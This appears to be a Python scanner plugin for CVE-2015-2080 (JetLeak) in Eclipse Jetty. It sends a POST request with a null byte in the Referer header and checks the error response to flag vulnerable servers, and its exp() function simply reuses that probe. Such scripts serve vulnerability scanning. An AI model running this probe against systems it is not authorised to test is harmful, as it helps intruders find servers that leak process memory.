import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Eclipse Jetty Remote Leakage''',
        "description": '''The exception handling code in Eclipse Jetty before 9.2.9.v20150224 allows remote attackers to obtain sensitive information from process memory via illegal characters in an HTTP header, aka JetLeak''',
        "severity": "high",
        "references": [
            "https://github.com/eclipse/jetty.project/blob/jetty-9.2.x/advisories/2015-02-24-httpparser-error-buffer-bleed.md", 
            "https://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html", 
            "http://packetstormsecurity.com/files/130567/Jetty-9.2.8-Shared-Buffer-Leakage.html"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cvss-score": "7.5",
            "cve-id": "CVE-2015-2080",
            "cwe-id": "CWE-200"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "jetty"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        path = '/'
        headers = {
            "Referer": "\x00"
        }

        resp = requests.post(url+path, headers=headers, timeout=10, verify=False, allow_redirects=False)
        if resp.status_code == 400 and "Illegal character 0x0 in state" in resp.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url